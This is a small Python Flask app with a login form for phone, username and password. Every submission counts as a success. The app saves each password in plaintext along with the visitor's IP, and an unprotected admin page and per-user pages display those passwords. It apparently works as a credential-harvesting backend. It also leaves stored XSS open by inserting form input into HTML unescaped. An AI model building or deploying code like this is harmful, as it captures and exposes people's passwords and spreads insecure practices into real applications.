from flask import Flask, request, redirect, send_from_directory
import json, os, datetime, socket, time

app = Flask(__name__)

DATA_FILE = "logins.json"
INACTIVE_TIMEOUT = 300  # seconds (5 minutes)

# Agar file nahi hai to bana do
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, "w") as f:
        json.dump([], f)

# Function to update user statuses
def update_status():
    with open(DATA_FILE, "r") as f:
        data = json.load(f)

    current_time = time.time()
    for user in data:
        if current_time - user.get("last_seen", current_time) > INACTIVE_TIMEOUT:
            user["status"] = "Inactive"
        else:
            user["status"] = "Active"

    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

    return data

# Login page
@app.route("/")
def login_page():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
    </head>
    <body>
        <h2>Login Form</h2>
        <form action="/login" method="POST">
            Phone: <input type="text" name="phone" required><br>
            Username: <input type="text" name="username" required><br>
            Password: <input type="password" name="password" required><br>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    """

# Login form submit
@app.route("/login", methods=["POST"])
def login():
    phone = request.form.get("phone")
    username = request.form.get("username")
    password = request.form.get("password")
    ip = request.remote_addr
    server_name = socket.gethostname()
    login_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    last_seen = time.time()

    with open(DATA_FILE, "r") as f:
        data = json.load(f)

    user_id = len(data) + 1

    data.append({
        "id": user_id,
        "phone": phone,
        "username": username,
        "password": password,
        "ip": ip,
        "server": server_name,
        "status": "Active",
        "time": login_time,
        "last_seen": last_seen
    })

    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Welcome</title>
    </head>
    <body>
        <h1>Login Successful</h1>
        <p>Welcome to the dashboard!</p>
        <a href="/admin">Go to Admin Panel</a>
    </body>
    </html>
    """

# Admin page
@app.route("/admin")
def admin_panel():
    data = update_status()

    html = "<h1>Login Records</h1><table border=1 cellpadding=5><tr><th>Phone</th><th>Username</th><th>Status</th><th>Time</th><th>Action</th></tr>"
    for user in data:
        html += f"<tr><td>{user['phone']}</td><td>{user['username']}</td><td>{user['status']}</td><td>{user['time']}</td><td><a href='/userinfo/{user['id']}'>User Info</a></td></tr>"
    html += "</table>"
    return html

# User info page
@app.route("/userinfo/<int:user_id>")
def user_info(user_id):
    data = update_status()
    user = next((u for u in data if u["id"] == user_id), None)

    if not user:
        return "<h2>User not found</h2>"

    html = f"""
    <h1>User Info</h1>
    <p><b>ID:</b> {user['id']}</p>
    <p><b>Phone:</b> {user['phone']}</p>
    <p><b>Username:</b> {user['username']}</p>
    <p><b>Password:</b> {user['password']}</p>
    <p><b>IP:</b> {user['ip']}</p>
    <p><b>Server:</b> {user['server']}</p>
    <p><b>Status:</b> {user['status']}</p>
    <p><b>Login Time:</b> {user['time']}</p>
    <br>
    <a href="/admin">Back to Admin</a>
    """
    return html

if __name__ == "__main__":
    app.run()
